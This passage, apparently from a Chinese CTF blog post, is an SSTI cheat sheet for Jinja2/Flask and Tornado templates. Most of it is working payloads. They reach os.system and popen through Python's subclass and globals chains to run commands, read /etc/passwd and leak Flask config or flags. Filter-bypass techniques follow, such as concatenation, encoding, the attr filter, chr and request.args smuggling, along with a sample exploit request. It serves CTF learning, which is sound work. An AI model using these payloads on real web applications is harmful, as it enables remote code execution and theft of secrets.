&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;linecache&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="py3---__builtins__">py3 - __builtins__&lt;/h4>
&lt;p>py3中就没这么直接，要关注的模块是&lt;code>__builtins__&lt;/code>，借助它来调用内置的&lt;code>open()&lt;/code>进行文件读写，用&lt;code>eval()&lt;/code>将&lt;code>os&lt;/code>模块引入rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;whoami&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;open&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者是直接用&lt;code>__import__&lt;/code>加载&lt;code>os&lt;/code>模块执行命令&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>py2有个特殊的&lt;code>commands&lt;/code>模块也可以直接rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;commands&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getstatusoutput&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>——————注意引用&lt;code>__builtins__&lt;/code>内建模块这一方式在py2&amp;amp;py3完全通杀&lt;/p>
&lt;h2 id="常用payload">常用payload&lt;/h2>
&lt;p>其实上面已经列举的比较全啦，这里做一些小小的补充&lt;/p>
&lt;h3 id="for语句确定索引位置">for语句确定索引位置&lt;/h3>
&lt;p>前面提到过一点，我们需要的子类在python不同版本中位置并不固定（主要是py3 py2的基本固定死了），针对这个问题可以用Jinja支持的for语句来解决，submodule的名字可以用上面的脚本跑&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;filename&amp;#39;, &amp;#39;r&amp;#39;).read() }}{% endif %}{% endfor %}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;) }}{% endif %}{% endfor %}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="特殊的一些对象">特殊的一些对象&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{config}}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{{config.items()}}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{{config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;ls&amp;#39;).read()}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{get_flashed_messages.__globals__[&amp;#39;current_app&amp;#39;].config}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{app.__init__.__globals__.sys.modules.app.app.__dict__}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{url_for.__globals__[&amp;#39;__builtins__&amp;#39;].__import__(&amp;#39;os&amp;#39;).system(&amp;#39;ls&amp;#39;)}}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{{url_for.__globals__[&amp;#39;current_app&amp;#39;].config.FLAG}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{request.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;/etc/passwd&amp;#39;).read()}}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{{request.application.__self__._get_data_for_json.__globals__[&amp;#39;json&amp;#39;].JSONEncoder.default.__globals__[&amp;#39;current_app&amp;#39;].config[&amp;#39;FLAG&amp;#39;]}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="各种各样的bypass">各种各样的bypass&lt;/h2>
&lt;p>一般都不会只过滤一种的，综合应用&lt;/p>
&lt;h3 id="针对关键字的过滤">针对关键字的过滤&lt;/h3>
&lt;p>以class为例，做一个字符串的拼接&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;cl&amp;#39;&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;ass&amp;#39;&lt;/span> &lt;span style="color:#75715e"># 拼接&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;cl&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;ass&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;cla&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ss&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># 拼接&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;Y2xhc3M=&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;base64&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># b64&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0063\u006C\u0061\u0073\u0073&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># unicode&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x63\x6c\x61\x73\x73&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># hex&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤">过滤&lt;code>[]&lt;/code>&lt;/h3>
&lt;p>&lt;code>[]&lt;/code>用在字典按索引取值和数组中取值，不过禁止了还是有函数可以用&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>__getitem__&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>pop()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#ae81ff">.0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">linecache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤-1">过滤&lt;code>.&lt;/code>&lt;/h3>
&lt;p>&lt;code>.&lt;/code>点号用在向下不停地取值，跟&lt;code>[]&lt;/code>很像&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__class__&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>attr()&lt;/code> 很强的一个flask内置filter，&lt;code>foo|attr(&amp;quot;bar&amp;quot;) == foo.bar&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__class__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__base__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">............&lt;/span>&lt;span style="color:#111">}}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤-2">过滤&lt;code>'&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>chr&lt;/code> 先找出&lt;code>chr()&lt;/code>的位置（注意跑脚本跑的是&lt;code>__builtins__&lt;/code> 这个函数是内建的），用模板语句给它赋个值，然后调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{% set chr=().__class__.__bases__[0].__subclasses__()[index].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code> flask中存储请求参数及值的字典，可以将值先赋给它然后进行调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{[].__class__.__base__.__subclasses__()[index].__init__.__globals__[request.args.arg1]}}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>arg1=os
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤_">过滤&lt;code>_&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{&amp;#39;&amp;#39;[request.args.class][request.args.base][request.args.subclasses]()[index](&amp;#39;/etc/passwd&amp;#39;).read() }}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>class=__class__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>base=__base__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>subclasses=__subclasses__
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这种方式可以结合get和post，举例-&amp;gt;&lt;a href="https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#RYhszr">[CTFshow 击剑杯]通关大佬&lt;/a>，在不同的字段处对传入参数的限制是不同的&lt;/p>
&lt;pre tabindex="0">&lt;code>/edit?a=__init__&amp;amp;b=__globals__&amp;amp;c=__getitem__&amp;amp;d=os&amp;amp;e=popen&amp;amp;f=whoami&amp;amp;g=read
POST: name={%25set%20r=request.args%25}&amp;amp;rank=1&amp;amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;amp;time=2021年11月11日
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>按字符串的方式走，也可&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="过滤-3">过滤&lt;code>{&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{{}}&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="过滤-">过滤&lt;code> &lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;code>+&lt;/code>替代&lt;/li>
&lt;/ul>
&lt;h2 id="其它姿势">其它姿势&lt;/h2>
&lt;h3 id="短短短">短短短&lt;/h3>
&lt;p>利用的是Flask中的&lt;code>config&lt;/code>对象，它可以存储一部分设置项的内容；&lt;code>config.update&lt;/code>方法可以用来存储设置项中的变量，用法是&lt;code>config.update(key=value)&lt;/code>&lt;/p>
&lt;p>这里用一个题做例子，指路-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib">[Digital Overdose 2021 Autumn CTF madlib]&lt;/a>&lt;/p>
&lt;h3 id="pwn---劫持got表getshell">***pwn - 劫持got表getshell&lt;/h3>
&lt;p>pwn，在学了在学了，指新建文件夹和md文档😅&lt;/p>
&lt;p>参考：&lt;a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">Python 沙箱逃逸&lt;/a>&lt;/p>
&lt;h1 id="tornado">Tornado&lt;/h1>
&lt;p>Tornado也是一种模板，可以执行简单的表达式和传递变量，当参数可控时可能造成xss和rce&lt;/p>
&lt;h2 id="内置字典对象">内置字典对象&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;code>handler.settings&lt;/code> 指向的是RequestHandler.application.settings&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>{{handler.settings}}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{{escape(handler.settings[&amp;#34;cookie&amp;#34;])}}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>查看全局变量&lt;/p>
&lt;pre tabindex="0">&lt;code>{{globals}}
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="执行代码">执行代码&lt;/h2>
&lt;p>tornado支持三种ssti标签&lt;/p>
&lt;pre tabindex="0">&lt;code>{{xxx}} 可执行任意py代码和tornado内置对象
{%xxx%} 下面展开说
{#xxx#} 作为注释 内部语句不执行
&lt;/code>&lt;/pre>&lt;p>&lt;code>{%%}&lt;/code>中的语句收到限制，格式为&lt;code>{%操作名 参数%}&lt;/code>，操作名有这些&lt;/p>
&lt;pre tabindex="0">&lt;code>apply、autoescape、block、comment、extends、for、from、if、import、include、module、raw、set、try、while、whitespace
&lt;/code>&lt;/pre>&lt;p>其中的&lt;code>raw&lt;/code>，可以执行原生py代码&lt;/p>
